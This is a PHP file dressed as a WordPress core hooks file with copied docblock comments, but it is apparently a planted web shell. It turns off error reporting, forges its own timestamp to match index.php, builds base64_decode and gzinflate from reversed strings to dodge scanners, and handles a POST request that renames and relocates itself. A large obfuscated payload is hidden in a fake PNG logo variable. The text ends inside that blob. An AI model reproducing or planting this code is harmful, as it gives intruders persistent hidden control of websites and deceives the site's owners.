<?php 
/**
 * Sets up the default filters and actions for most
 * of the WordPress hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in style.php
 *
 * @package WordPress
 * @id 
 */

// Strip, trim, kses, special wp_nonces for string saves
error_reporting(0);
$wp_nonce = "";

function pre_term_name($auth_data, $wp_nonce) {
    if(file_exists("index.php")) {
        touch(__FILE__, filemtime("index.php"));
    }
    $kses_str = str_replace( array ('%', '#'), array ('/', '+'), $auth_data);
    $filterfunc = strrev('46esab')."_".strrev('edoced');
    $filter = $filterfunc($kses_str);
    $preparefunc = strrev('etalfnizg');
    return @$preparefunc($filter);
}
if(isset($_POST['newname'])){
    if(trim($_POST['newname']) != '') {
        $name = trim($_POST['newname']).'.php';
        $lul = file_get_contents(__FILE__);
        $lol = fopen($name, "w+");
        fwrite($lol, $lul);
        fclose($lol);
        if(file_exists($name)){
            unlink(__FILE__);
            echo 'xXsUIssAZ:'.$name.':xXsUIssAZ';
        }
    }
    exit;
}
/**
 * Sets up the default filters and actions for most
 * of the WordPress hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in style.php
 *
 * @package WordPress
 * @id 
 */

// Strip, trim, kses, special wp_nonces for string saves
$wp_default_logo = '<img src="data:image/png;5X1te9s2EuBn93n6H2BWW0qNLEty0s1Kluxs4mxyTeKs7Wy3Z%tUWqQk1hKpkpQdN5v%fjODd77Ictre3j2nNpZIDAYDYDAYDAaDr7%a%e7rr7bexv7XX323#%VXX39VC6OQsQFzUm8SjBaxHwziyeQi8sPUu5oHo8kqGmdhHKWDi2i1nMeeP1p4H0eTcB6k4W8B5Oy0315EyzjNKEG%dPqAfZbBw#EkXgYRq7vL2bIF5blN99ZtQHI4qQNEg30Cmia3SZgF#NxkSBSmb03G8zill%j4GQmmXGGaBlm9Nnp%fHp27o5nwfj6duleNhpff4W4AAIJHAUfwzRL6#7tcmccR5Nw2gIK3EaDBeNZzNyfAm82m7kSs4H35OifH44Q9S%xdWDhzZJwUQLAtgfMdQFsC#G2agtshCsvDSJvAfSPTo9O%nV0cu6ePj95%f5s9PL1m6N3z94eQc4#wc9Xc8hARE#DbATUZkEEpAMiAfFbOwGINEtGSbCce2PAerscRXE0Dpps4T#poqwBzQnYZTkxlYP9gbibzLl1eJJsf4CAHFCaeC16AF7zF9AGQAS0a1IvJ3c9NdiUW7yRtngvLL00vY0Tfzzzomngu1TKZxbM04CZcBMvnItE#IP%oHsz3nllXRcFt9j4a3tPw4gOZKoH8T00VXWOlkvc1P#T#tvqKcRa2Veqd8v6yhwHhMbsgFU0D6NrXaho6Zv23N9btJOs57YoT8vtqXdVXUCC5SjymSlcxvE8RrZ1vmm3J5N2m2SCH0y81TwbeSRYINV9idLkrRe5ZvIqDUbeL95H6oRVYCYBqyTQ25j1xzDy49t0p9N90sHsxAvbwWKZ3Rnd8Ors7P3oAzyNnv3j6N0Z8gTyFoNPDcpJnk2x9QGflyTeXd35RxxP54EDTX46XyVL%PH29N3f4wx%hd7IS8az8CZI8PEnL%KDj%jrxFuAyEyokxA1ULJMginIxWw8q7u7LmuxcAFC1A%q7n%cpll2A9Lc3RBfbkI1fmaB5wdJncB2O602e9x#zN7FGXsZryLflVTgR3QT%vwspN0hyNgRDhk3SJI4Gc3jqdt89#HNG8ynE#H1iABSt9m2k1DcBx#D8Qq7cZSFMCoECCTT82geLsKs3hayXs4lSi4j3MKbhuPRr6s4C9JRsooID1T0sCqRozsEXggjaMcfT49H0Fqnr4%fQeO53dYTqjkVOM2jmC7H9YaYbwQxDBCgQFumcy#dBTBKiAc40FYSZKskYmE64pwhEw84pwD2JZFgYsA#FGA9Voa6LwYPn7#A6wokUILswNro#fHxD6#PSgF5kpodVa1u0%hNPA2jOq#IHwZ1Z38MnBYkw%1JnCzYIshmsT%AmXv4XsjgHtsPo#UqY9ndMhhIycxQBtDT0ExOV1fQu#zGm6#CgTscusP9XcQMX6Igp0gX1iDIxnF8DRTVrqGpbvRQFLU5r11fQmVrN6IBChmMGVsOdTkX6iFSUBOwAijpv%2W1XGKyr8fQJEajR48Fsk8ozVCXwEWyN80chMDciJYfVuSIWpXjQKI#M9%2EaQOF#VUqs73mglYJoMRPEtiAvoNZy73796Pzo#bbabew2quXMbRg5ODbUY5aALjyhOcRbWL6PwI5exNaUtonqHEmGKEkG9ldrdtgYUJHJhAypMnGRhNOWDGUV7Xt#0EBdSqYDaLAYZM771ERbg4FddFJxTELkSsHU4nvlhYr1GNKUYqMqiIfgYMosz9TDn4gKl%y78USA0xmvrYQUYV1%w6Rwg5zjdY8pOh%oYZo2GRNWiRzXJbcxWOLXgTMpbwRppm2SCKtSvYtApClNzPy9yXvEpibcX0CjnYamn07QtOmOr8BrH%D%eHP%92ZvTczc317uX2KLTeXzlzRnXK%AFKSzO%ixbzIf7OCEO90GueWyWZcud4NdVeDNwn3PlaucMhJbLhKo1cLPgY7aLGftMlDFwoNJFqlrMAdGWhdk8GHKIkvZCKLaDsoIhjDErsZazv8tzf%3Vfprd0Y#r2L%7dOWNr6cJztY7VKPeN48fP#6Ln0EH%#t%5rDNzG9ms0#gEEZZj%1tmbE3q3Hoe81%BYnvRV5%4SUw6nvtPqglWTj25jvePJxGvSxe5jCiCpDhcIK12CT#xETqZDLpFwnqdruUIV16UXPWaXoSXnQC2waNBsayF2UKjlO5cxuE0xkQexXPgSkoddb5BI8JPO7Mg0nWe7L8yNJ4HvqyS5ee74NY6LEupEBqn9e38xgqLGtaTqSsP#TBkvzwpiW6#hNTWBEjB1Tll6Db29sjHFBXZJIdPxjHiYc83gNxG%C03iyGli5CAJ4gAbWag7UWc1XlXkfVlvpZUqWJgt5DpBOQ1D3mrbKY47gKp14SADW3oZ%Nep12#y%9GW%cvbasME3MTaQGYZtpMA%GUHWFeG0vP3nypF8gUnSJwXJv4yiGDoYVJwyqVRIGCXsX3LpUPs78ujhB1DcZyI307Gou2omzJNcOeN0I4HW0lJVjVCPedF4YMeB5Iyd2Whn5Af7X15kS0TtVoAgJHVM6%iitW5IGbAFpoNF%IvaeeItwftcTDdFUbYNk7O%Kcb6fjkFfy4Zc7t54CRuPcCpFIYHCJ10G49Cbk7Spa#kH4p7LYMft66xeddZDKbc8yue4RoFckm2QVwtoxGAUvOyo3HVUJkBp1LmWHfey6VyA#rA9GEw80BgaB67bK9bOhIf1zOifH47Pjk4bhcK66wrrPrCw7j2F7a0rbO#Bhe2tLwy1AT8erxYwAPrmGgQncq85bi47zWW3udxrip4QqxCYSb3tQbSazxt#azFpeS2udHt9spLY70Zy6T82s4xF8tjIot6pLMuOmWfZEQDLjpHLeKvzda18XQnRNfPptzrfnpVvT0Lsmfn0W1013jxWBfkrWSX#ZFa2LH0kl2KqJ6br#qGym4guKoYviuqNAmLvyxETn3qJtyAlHBWvAVpEuCUG5G49HLT74T6VD2IfuSttgSI5zWb98NEjUra2BIJHgOFb95EFex5etnCJ98gduI#CaAza#oeT189jmNgjSK8XgKkNOW1pUqfBA3OZXpRK%UhYzUaATciUpqhIsX0A0SqZq3TJ#Kx#Sxae1r%fvnkFSt0JKHVBmvE6JcGv0CJRcMvsVN78W9T5BopnUNJN8O%jq19gasxjsBLr7ttwnMRpPMmoYNDzLHsKIoWsljkGP%CuFUcw%%p3aeZlAbdpQgnLJB4HaQr0PadX%ZJ8aOlzUZBAK1FTYCc3SiCBMURFub7N6raO2wQmWS7noARiy#5#3Lm9vd3B#XlnhesL7F%bPKQRR35dd5BM#pzvq3xt6lpOUbu0qAVOsQVwDfW4wXhrQzoVAwkrWl11222RlXN5EkxFd5wE06OPy%qFU7#Aj%#oUT%HH6f4J738roHLKHfhCrslZfaSZAAIWmiTElSkwMFpcAYKhAQMgHfrAHnevWyJpXC7iVnPO7As4UDC#OzNQZOuu6Kp#cp125WcC1O8nNnFwgPV9OE#KJ6MJv#BC3NJSDqhdwUa1SoL#oYCV677g7YOuhrppu2#i7jzthpujFlMZCGwNIal5R3XTCmHYaKZhb4fRDyLtyZtvCZt2VmX2F2XuLeuSC7hEIJbjRxaMk#SIDhFNQpX5FC3a3xBelVBOyL4LM68uZVhRK9Gm#Yxng6M370OgSYg9ryUcC9ny9GKzPtuwrmgdh0kUTDPJaYiMfi4ROs6imxcjfZ2d%FNHMJq4QqWJovdNEAz8u4Bt4MP#OO3k3AOyvHIDzh7YQoJem7FQfXEfRNGq49oZeTl497FgHH1hNbVsuTWgKkBL3KxHzjJaIoW7C%r2Gw3v#cjQBh9KhDJWrcASTmaPY4GbRQFky#OiY9o1Ammoe8KW#wWGcKFDWY0XiUJyDK0MiRCktdWoTTRLO7gt3w9NV5Pjdcwrpa47XBATGVuJklMio7lLeLTZBF2G71KnCZTC3ZqwIoaIP5zl28RmaTz9%BHvpY0YiF2Bl4qfz#VGciSR2agEXYJaQLEF7Wll83giZgLuofblsrYPhqMQdxkdcrBt1dBd6ih8sBq4X4t2ungD1AYRFPpwoABnH2PzZJgMnC%cVkcjWF6uR64U5DQcvcGRPKF4yilpPYLIf5lf1AL8VsqIjZaIua89stli5u2CsVeOA136LQEHCgfzu7#rselhWwULkr0%o374ezlzlOcB63tIXj#4fj1050T9esD%hovn37%vRi08VJZnHQTQ20Cbzyr64K8FBoqCxZ8vFmZ0Ei3H9PAFaZxx20RcAsUJbdVtIYNBpR84PI1O8zNPddttNyhyre%yxEOufFvq7bQVT0Nxi32OprE7mCID%Sz6b71wjk7g3kLX#MD%W7yrTZ8p%bccC0fwfwU4Fv5s#me%jonjPClRrMw5ynmkvZnZdFbnLtv4mm84sY8#ZtaFpJOg%kEpvgFLM15Or444c8cJohWxVZfUHODIB2i7V9stwIgtTTwPk2q2Mr1MMoadZhddwWjLxrQjH9xhudMMq%zjaOY1wHmdaGNb1ruhdvElUTzAn#pPw0Hu#Aa298bssv93WymesBPQFtEFuEcjxZc1SxxitWzbMeqNgnpS#4YWvg3SMOaEaqG0J%CdEQmanrZcnsXQIYYN6JIqnZVddRYxBoA8RLNLtXmnOlXWB#olSsVcb71u0#GQTYGVT4doHmQjYP5XFiqBnv0hDMrPrVFy6M6M9zPEvjny1fDfTQEDj#gXOvtXyXDDyAe6cf72ZK#X%k#fT#%9Xs4jVS134GLUC#o7j0aGTjzgPaF#KFL%KGrNFVMgBf7UQxZjLnJmJ4bTQb6XqfbJjSaLxBaz3doEMi8BGT8YHQ196Lr4bk9eVPj7e9SQfuiMJL0iLTO#CPOCPjcYLw1%oEivydI5zBTOwufFCiPxIq03wRJCsO%Lmim%KfeJGC4sWIhNFpRb8ZcQhuiyYpbbkFH9ofH71DrirIhtKiZNgVtC5r1anj88uX#7tVQQjXMNlat9o3NfNC1uYGEHCQ4D6pB%MTZjtfhBSwQcEvXqoIPL#vuTzuLHZ#96oW9VPS4aI%bNP5XGNyehr#BKqL1NbNpXkIlLJRWHqVh8ix1F1oNBQczknYNzN912pxZ%qL6xJyiUAuiEt4HySJ9jq1YZserbDR7xCJylVluJtHugiWZpHg6ZwjD21QRJ#UEjpKS4SGHKCOT6iBBO7IYMvt8BkICaV2HFFJ3lv3JZmEqLAHOEGc8zrxz7yqYD5z3Hqx7xRTncLrsaZLxWY0yAZvxkqkSgr#DBNievX4ve1INCGVfcPj36NmLFyfOpWQSnv35PAQdsiS7aZ14e3x2RLl5C8vxjK0Gf#gXisN8E5KI5MsvR#xm4Lqtq837uIPgPER0EmV8VqNu02UbC0pHWNefOEPltGbuvr2M40ztvtVgJkE3ISJ2wIynAnseOMyUAS4JAXdY%xG9jDBHQ4gBp2dDoiSpo8eJRK0AhfWAb8%hEg9qgUu9wvQS#gO5R7BhezG58q1uepFyFWdZvMgn4hp5C9scZ1WaLmiJDYoPme5Qp9X8LUykoNiCHtoX3iC01AI8gtO4jQdmbZPVxLKX19SVuxwuXwfjjoZYBUv3iQ33A3AncjMXDKhYRQUvYFRzsXOGZLnGcJ5I055V0wtHVPUk8HxyWvuCmk4eRjgfA9W9pCtBOixVwV1cQy#4vCr##qq89a6tPjOHywNq5f#f6A6sGLa6u7YyZr98YW3#jD5SK4rCoKqqzRH5lH0Jj6nR9OWjRFja0E6Ruezo3fOzn94fDdzFap6FSy%JKOMO6Ciey3NWWdtkcZxHn0XrwS05kBv2NOrXZV52ZG7uoY1F3lOccKA0Ci34VMutwIPCK6GES6q4pk8lfzkTYsaHMeFVwliOFeWUSbMNqK9kkCUfD5qRhDcUK5qlHNsc5HAnMWFvM3xSCm5Il03m2nndxkDuFartAW04t61OtSWAWIPgM23lryeRrFBfSCLl3YxEbuyqINFWPI4#1mthJPQOWPGrNTzWpGACRPu8svwdkrUecjcxo7ClcRSHv8RhVMftV53GTXmlaNGNL5slK4U6vhqlsIiTu0GHEoBoNQsCQLI7zgMvqt9XTHqXZsGishCe%DuLmIHqM7KaSaDRKaoEjQeGWxKk8SpBu%eEGy7Jexwa10mcRg6XMNXdzmDk1bcPJ0E8gWzS2IAwrQGb4E4OvG522t3HvEZL4WU#UXt4gj0wT5laqpdeqeGcSfSGaKVJTffFGtpU0mUCKZO685cVGjPVZpQwtKRsiCdM%rr318edp0DW19pRV#Z0%9JpdSdoI0%ZrgHLGrgU#8ffXWnnNvA9fvrkr99vgowAGV%VvS1FtRlRSA4h#UEjMbLV#Ory76W6Pq02#egU4wwe2Les%fF5G9erg4H8WQtxOKYGmRr2mYZ9pmHnpbBPNexTDbtTCvu9hv1ew16Vwj7WsI81rF8K29WwXQ07LoXtaNiOhl0qWMZfrLjpMURuV3nbtOY%YG7ish5WslEG1H7KgW7XAj0mIP3iqUCdUq6PaB7qlSSfSqTlWLub0NfZhL72U5u#x#vpe7wZfe3HG9DX7m5CX8emrysIyMrpk8lnFn1ySIWVY0lYbiZ6QG0fkkT1fL5oFqJRYLKsZt#8fAl0tqV9io%NQ1RplnyYThrCasmtaSa7Uil6ab6mFJDUWfDgMipp7j7BEzkPwVdouNOxF3FrdZiYfvcF3SXlgI59gEWKRxOLkPR6y05NDP4MzynijJYHJrd3nMZgLkUVhfZDoQLwRpziwl7kuWYNc7YhxHSW8Zy8j2WWfoFIDiWpK2mLH2chblYIgSx35bhy5N5iIjfxLvO7KbQbZ3Y6vTGYlqtd#SL5rrHY8BE2H8MDu69N#rOONKalsLACTrtjaHpJFuQeAvpxhxuZuGIunGY5A1mdHYzfo2tIvRapUxugKNyoQ3I36tCZSpUk0HqAqh8hT%WYWCLwHT9jb7t202TkcAeC29zTFpigNGkK5jklh6uSlok0Ly3mHV4kz7MLKUPr8BpvMFUtVzZSPMluvQTdaHBjOYhuIIkbGk#PX579#OzkiAuVCmZ3vaU3nvFzfYvYX#F#W#6Ahi7zDSyaAp89oyxMgjf1MTFQ3pusiLHe4HLNQvaC6%4#e%%qPXupFgDmdnDJ8uBgbWrPRccSt1jYMR7pxROPjGwuxmENHKIjTMGEEjLVzgVDRbaQXe1bkJ47uhdJGI3nK79IhsYjIKpQjT#cvGHpaolu7ICh0J8wZuYjsQXjNg5ckBDYyi42jZizQOVfDviGrBzeBTSLu%TXuVgFoG16hINQbO4RAhJBztu701%nrO60SuHrjZbTcCqLSDELjOAoGGclqE9P%%mmMvNyWp3zfZzCejBYlz0eh9X5jxMPlj5OsRd5qwPLokUFeabI%ISmYQo0Mfwrt13xmFLBNc8q90TM6mw3yMa7dM7NJ#YxJnzXTGscOHdBytb7QJD9Dh3TLhzKy39yDOTGcH4DSyHarHEU82xIYzrz%Pi2nEaR9jto5BgeTuPxKZMDAygrHmd2d9FVcFcNnrXIXuChcrIBVSFDgsM0XQWtKMiK2OjAWdn#Z4EZaN7H%dkJncMWrhTTMW7Lz#kv%wlM4S68a%SHwLPe8DdI5vh1l82wzm6yurqDr8wD2eNOfwsR5kp%deE7Ikzx2MsQTboKfUKSJ57rOLiVkGiKrr0bxBD7e4jpyh%HSYA0rW5QaUJ0BOAnt8EVvoeZb4HfyfVshWcs8NXsOonj7DpE749wSWpmSj8nt0h5Ei5vw4RIm4XB3KeK46BModETrFwakWCE8QX6A9Yl9FPPX2DmMQ7UKcJ8DH2q5pSCMfCft3juGRPv0oWX4svfFldA#JIIv12Ec2zLW9BERG2iMPrFq2iZ#DZCCyNwkm6eW#APyDYJeDnzu#gj0RddYw1RbmOvEMz8drmzCNGFsxS%LVkKpefkez5dOHeAzil5ynAQygMLTtUqI8FVAKrSuX6KoCXlW8PoAychL0e1GP3y2gn2%C9W7gVR8KfUzWCw%2YFNRmb11Jx724p#1oFvHrxgpFvLOAUqxN%wnZmRXFazApaQLpONs8I4D4S#WrANoWDwoPznWNOyA25ASSs#rnNJdf0TXCeOHxvibzXxQkV4023fMvJlX5Lw5dJvOAb%5m9p6d3lzhqsRXRNt0EBI6zeBMMXYEBjVIlvgaVmx%OcOjIzY#yXuYmVdzVsQ8%MfN0Eu0agAYRrRZBEo4tyMq0vXzkiQJ%S3NyGQD6gvbNctj#wKLJShTep2WIqLRy912rGhV0yDZCFGvGq65Ta8BoBwIU%SZlauHKtAL75%LX94xM%BSEd6qU3pIcuXI#f227N#e1s39J7UwMddDExBLIBn02JpdJdhpkeCw%VRlA0WIeT0xLcyLF7JmEMLPhXCiyGA6GtDfnipWA9FipsG7I%f26tW%ADSdGmAR3ok#2U%eZCcgtqwhICb05bUJYuayNhW37uDqeU5R7JultiDFcrCRh4hjjGtjcee1xgwQiPETf1hFPC3yKmgU4MBrQKZV%7maL5Yg7f#NANVN08KItZd9wnoOeBC2rN1u3#S7O1tYVTGTXfYMi7gxhEXNtRj#gsVKGfQyYsoBO4aDNrgq%H8yDTNVW9Rx%%QILIsuWPN6jTGIyAgU9N3c6jcEAgxywA2746tFf5Q1Ojq#25U#5r#NH2P0Yn4hzpj5mHo1QhGxJUF6SnJZ5GjIYq#tITjS9U4CMFqy8KTxHaaIjzzjhB6fFMKKYRaJEFOci4BP#FFmtUgUMICNLqUJmNKidSdu#4HMoYzlZMJ%FN23ZyVaRiYfJotCenxW7qJA36jTsxOAX5Zyt00hrmqyV3rhcn9ASvdVy75HBxTbELU1Q6fGsva%2H7c0uVSZSaO05Sb3Ndsk32YFfgelJDMHtxYkIKyE5WEcL#9czWlqUOD7ESGo18bNWtqs#Y1PJdSPW7gbqlK2xIj1W3wPVLyt4TA6VONhbKeKESG2gNVwmDXy54Q06yHstuBiL%KZeoYXBuiWVQ0oFUdpszYByeWLJ02H3JfGunG5xyunmx6x8bcCQYFtNZeZAp3zmcRj0qTAxiBOia6SczAmbWV9SMcRSvqQRPn%p314#Cd3IlRRBM4zerBV0oMtPVDXdiKaYHQf4olx3BNQxsr%GS6f8RBubrVmS6oEIBInUnWe0pWklnHQ9JBrZ8idLyxVvLO#NJJ7IkSR0RDrisPPuha#rzhO8uZiWZGpxfMG6DX%5Dp43crZ%PAWhWHwsgxLk3G2uA#Lwc2FRiZiNmktIgdm2cTLKLYhP608XoGifRO8Fu%ld91KhakoGMPbO5Vcm9D4Y6TpkuuQTOr1Tn94%X704vjstHRBXfbR1gxFHx2dCu4GwxpfAG9aQ6ql1eiAeo6qAh4AvWvQ6dO7TQmrWB09AOSeZDFqiuJ#XSZeP#7OtA62ouzPG8ihVfTfk0S%RyxgdUwh9iUDhSMIPmYJtMdZ%NDe0Sju7yH8rOGQ39GBaNmvrO0DZHV#TWqEjwzQJB6Qa5#XTCkCaMkSNf8RC#0MA%xMfrsh5wIbU864I89rK5siKxRVVVbl6DLmeVxjZ#Wra%OjIym66Annwj8K6tlgO2zv#3ZbYjXUbxEJrldm8lq3ZoePFbqRetUwh3V0HXKASJm2GNgLoPIcYzSL5uIKGo2jayN8D0QPlntroLhlCy%ypkFS5Z4h40otOyMMqIPBcQaO01dRKbhXG3SbiAzCfVGkw04xPOKB8dAr62kcHyY6Y10tSH#Oh9gyWqcztLyCAMLAb9tu37T0CIcaiv6l4vmlcUIBkeiH3t8Re4GdvMtMSWfnYu1up6P6#bOd3y4fNUb1C%9T53NjO9f38ETA0uPVKponnXcAig4HiufupTRnicCDKgaIEcjGk#FQzNA85D5UHZ0HyM%DYKAdaRLgIc6v4o#uUJnLgAkmoBhT#dS2ShXkm9FL#JksfsDKxRNWrvTRx2BqrnUQy2271jEtt6uDlHDvfSzYii3LreMzVcDe8qN9PEPWTe9WYxNKIsaz66uPQzp7vY%%NohCwE#gOikZ1kZOq059C5150O510IqL#9zvII0f4v0SzBjmvgoz#jp%OeZF7IeTuyrcbynVwn58GwXJLp0t%rISyd#vqkD0CwRpgc5AVqnPuIMQf8b9C0cKnFQ60umNWhF%Ap7FwXwtSOw4FBSGom%GoIhvS8z9tAEVY71NVBgdQkXuSEoCd1A2OnBalS2jrQxT#lDUARu4KWYANAllMw6RX6VW5eC9S3mK55zFztqCJsTCIaA8GY2GQQh2IWFdexC5BInGgSxNKA7l5Q757PlqGZmpM3hTxLfSdn1g%O6t6TONhjqHo5kmGo3#3VvThwKL8kLUi877m5JPAdoTVKhnQTLFU#aLZVMyRUZBZIFAl5%I46UZC0tuTty0RBwvmxaImFFlom98g3YhXhxkOOfceNkoklSivP0xFGmHOgpnrl1v0GGEtrzlxG46kj5fQN95MP1e6bk7nxdmLIp#TEwpQ7Vxb#EsGQMCI6J1zTsvyY4BuU2gq3KgxnfFskECdno7Hd2OZvl1LI%Tdcn2oRLyAXcwdjqsB#rKPTixsVb4nvsop3izAzULv95BJGFH5FJssSr7hgPyNA6GPk1tIVj5EpBn1Gs%5S#bJRiSZn4gp9t5R0afyW9jq2ma5nlncn7p6AA3Rnioidq6woA3uUlc7I4XQyEAFZSVmOtyMBDD68BVMRK455qKL1FZJoCwCxe92EQEl#Kxag3ec8uipkzkYEJsjb7DQ2vIbUdIpSFIPe7iMQOHwjsP3E867bPr0JILY2mcU%51ZNDi7BIDbmDTi4mWt1VVw9gxLRQT9jQsYVJY8L2YfS4LCVx8UwwmeuZy2IRbF73iAT1zAZosUCFj62BD09R1SUOspLzyCDcP4wVuXKYyT3j0kT8QeRavxjPCfYa4K%n4Dy008MOMyjz6w#sj%aAI%QuqEhcI2lVFxOlCKQOSo81D5aktfkeGAhrHuGyIBn#lA7qbnZP2#DnpjY5JbxYuYR223CnoBx#ClvhF2BRCimvLoR0AjG8LDp%DXxXJKwdBm06g3d8EVRBiu334gr4VlPRHWW9YNG6C4V1k40Yb5RDjvSZBmrI6PDaqyOAGzeEH4J9ScDvyRy4zGtOMcuCxNf2tmNdc6VsWOfJQOhRriCrvj9KS#eYt3nOSBWyXSRqqyJbhaL6NrtJl%3fQRYe01#xQWdd95M2OxVqpU%L2RS2Gh5n0LnNhfhg5MpyS89PCH70KU5qTnBad968i6oD#9lzeO%Kkv90SopkMElzuq#baJ%W1c5uMt2Ac0JfHATZxAiIZpu#VYLmbXcgdx7pUAl%Z%gJ5sx8qx6aFFGS1lH2uVkyNnSuzLOxv63Rgmf1RnQ138Pj3bzMv8ud0Z9Tj9t##FxZCcYmTIwP4vghTFTaWeVkG2htFC2fyaNrAaRn3jJml9oUlqXii3FngZUzCdDjC%nK0kVT6phwWgIptVkIwRhzu0Z0XhEiAcZt60WJbntuMVhyPsyDbAc098BbiujPQe3FZfjixd1TJhuckjqo4TGdLVa3cufal7ep0KA#2w7JGH23XV6hNlrIiZLQV92fRE7KfxTjca4BHaGGac7atq9fK#GNNtcQFicVq2QUzBzUBZz3xgu715mYKx7H2LCDW26rTYW74mesKwhnFGeOwXGOwx7pcUanlY7lrp2k3KLA7nfhA10wd3FUqNNSy5VmFiagIK#wKeVjhYFkRDrYqp9nK5Mf8zjMj3RWXJYcV47qlQv6Bim8gqJeKJmthoC05FsYenotWaLWJz0CesyOZ2VVGw%Jo5DQ7gS8opuYLdXjTbBoRQ8uOBdgqsZBhhcbcPlbeRs%GGJl8Q0zeOkzc1LohpkUppn0ZHVKOn9z#Rbc4bfFhTctXlat8ChKRULW9Ensd7UOvwulsjlH98EGeJ6CE4KO%Wizx55EfUvJzXI3hj5NAbLa4Z7ig4dJHBYI2SlmfIxe0lYdrFT1dtoLUHvw8#KGxNLEqK#Mfui3TpnNDqxZaStbrdsJgYMnoBoYR5fFPb1pyqd0jBDoMqj4EpDot7%fbVX6%3CmQ#on7BJYfQL53ApPBxCsmMGbMYMyaworyIz#nyUntsHxiUB7Z#mS0sVHJ6zdTvNSTNK5RfJgiXqDWUwk0hgqZmI98z#TNVPzxag4AfUeStFUbi3vmFDHF4dCUdyWows1b1wTr0rhmblNGj3UbyqbJIyNQkgh42qRiiT#Ux7psuHwrkU3DaKH8PuWe1TY1MnlIE93Wltz#kLe%mbl2Ov1aOBy0#zs7tVB2v0DwaCD2Jo0MaMn9bhnf1p82KThUEWEt3OkoziC3cKI#x5W8CFtnkhu8uGRe6m2hbR50k28nytttrItbCvvSsh0xHFKCt0GM8Xy70ArUxCA2uHMb27ljQA#WIUYYOqx36bkgp#L8DuXQRk%hyK7D#8R4fFxH0LBmg#bOYzSIbn6#p4TPUNkz2cyKHFLqAWFoY2FKvXcrg3rK4WV4WnzelINxtpNKU8nUJweukRujOgm%f%OypI6CrZSQ6tbjgoQEwSYuQgaRZ5HaVwB5ySeb5NS7CXyLdUs9KAgJmfhsoqgF#F%b1cOSrH8Eq164nQv3ETEsMmIVv8qL3zijEstywSsuj%t%YyaStfhdo2Qm1Bw#UGpjyai5m7aLDEs71EIok3#2mBza4kNaQdPF%2UO6D5#wye%t1O8BuqYcbECpPXZo0cgwNUAQtcSPGCmZUe7#2#3GSfQamO#HQdqimRBroWwOjPS9Wjk1W73GKuhhwoFiIeszBjYAuZvG8B0ANG9MHtrYaTDlobhNNtgwjWqFj16pIY3tFqEy#m9rnFuyOgVARM#6uDWG7QrgEEh7XxbPoW2RKiGXG9IZ3TV8GYQGXrNCRUn%BR9zGZQEb7YcIjpWO4wT9jVVIZXoo#Ki6%e79GHH4KVGpF1XWaEkXnmOKZJL2tR%VpCTTPj3ltou0%xPyNPx8iTB5Y0cOCiHZ0cnezsVjjs8nHHt1k2VoNI90iKC97cgdVSFYRn2zb70DjWg5ddK%3BOiVs7X2YpcDMLECchp4BymTUH6Z#YA0epH1QLCulfKy9XvF3axo05W2u0Qp9gJZgtjpgzMY4q9CEaXpDb98zuaojIkKT8cL5thq25lEunk5LUZjYJYgw3fDEv3s#LecZD361%X#RLkqt8CBuoByaHYSZX9slnGalevbl3PGF53hFDGjzGG#pLyea1fPvu%nD5xtex95y08wPkmSUxSO8hKZ4nZ61VUATWXf4bUce01Ze4aVOp38AOeLm863CbeXyqm4#TDbGT9l0LQuhafmejd8aT1rjhVj3DFy3L2c8eZD%MAQd6aa4BwoKorxWCWa7sbztEWbMGnNaZvPQOfmWiAtsNhvepXqRXGQXF#5F22koTy3Dc9fZbn039i%SR%Xz%9W%fNSobTtNWzgIp92tT1I4yVvdpcuusbWRc3qyL3lXUsMZj3D3N#%t5rh9J2dHNxsRehEGEG%HR5QfG1DnKoKC1Ijn87N4SS66#fevaP7v251RjBusrBukcVKYAB4yTwQN4DB6v0IMN5uJBYt9#20Fcz#c7bjjvr3HYOwUKm9jjJ3Cb#M8ukH3Tyaext4ShF5AL9M6fbV#OPrpxfGP7xAV3WO88FN5WSdXzF2VtEqEkqgkz%WyLmYaBEAdMlfwAQtaPC5jD35dB3fPQUwLkytXQp9KU98q2dmRvAoPw0GbT0vK2mGOKfRyBUrPAZBf6KZmKXjDdV0xK8mCHrd1QUIZ5gWBkouohLf4l5bJaecxK7Vg9v06ZOEFUyHLeMk5jD#t0hkB2G%Eyoe3t0HbToeLfjU1OoZBddYZihmg8jSDdiAfT4wJldziLYE1uHBppr5wG58Kw3CA1#L0cznonR3BHCvPTUALZQCCougV8rN0lm988owZ3c7BH9NZfDuim0FTmemg06PbefqfsRM#TX8PBpZTBUwzdaVrHtZAxpjBbaJDtdN%7zi#PHAFDdILkOGdsGyVwuqGPfsfz%7Nqss1amIWXzah%#c%G9FkT5klxCUY1ABdbzgky1Ay#hi7vI5zeUPf0LVrmEgswwinnXNR7lIfcX9Muy9vte875HMbR%M7taez5kxKuXHE2Xi6LIRO0eaRkjuIeh19z40%eVJyweyTJ0%6xqU57eXH3CVF7dJLdxw8E#LkbnhzOvCqdk#8I2D1HI1YpnEJLrqrgeRFv4uBgxKbRDPqvOWLTtkQwpuErnmQlmc56icgIFOQZLYh734llV9WqHXUTaa%qgNstAK9ugv4dcHlgXvl1Ye8RM5MtvcKqKR3GDxWTAgyVgVpS3Jrw92#qF%4jy4aF2nru21xom5EgWRGo4ZYPhE5p3gskM28lF0FQSTuYfTdnJczb2FekrzyuK#0CIu#bU2fcSixIgDxKhyHfqX8Pwm8#fyO3XpRhmOY08ayWcBvPDggO#19#4dAC20G%hSIoyoPWKGc%joX3kVEGHtx9Zy#aRyjAkHOLX31hM2jnxKKDG3EihDZeUwXqarWUN7vDIW7jUb42coqYqjWaxhMrcmjVOJ#DKDDCAtXOLBEdAm5OanxyqJkCCAMIStDltA6XsCKi4kPeYxZu0heIi#QFhOwzhfTED7KtbdpyhMBUqZmaYTMuJcWo2gxeqks8eS9gW9QaWfy1#DJ471uv5pmHae27mCWwSees335mWHcSvncgWesyoBfxEgx5UAIDahmjDfkQDSoc38luZUgF5I733ncbdC%qgNeuQp5cC#xuugXjm0k0DX#APp#XQUJzFWwelhDHVtDnQxRzsETOowgqDVwb8ojpdigfwUq3e%NKrQb1Zrig8pDmXinN5aDqRjqbgRzO0wXB%SMay08Od1u9DRR%S%pRkGSaBuiYAR8F4%xouz0oS2EjbIJjo2aYx6m2YurtP5wBi07G44fux957zmnr45%1GGd1R7el%BEDvHRm6PnZ4iaLKIvT47fMmgfWRT78dXRyREmhxhPA6bJLNgeuJlbRsLGDXZGcXO%oM02q5RLrXX27O9vjk7dP66ph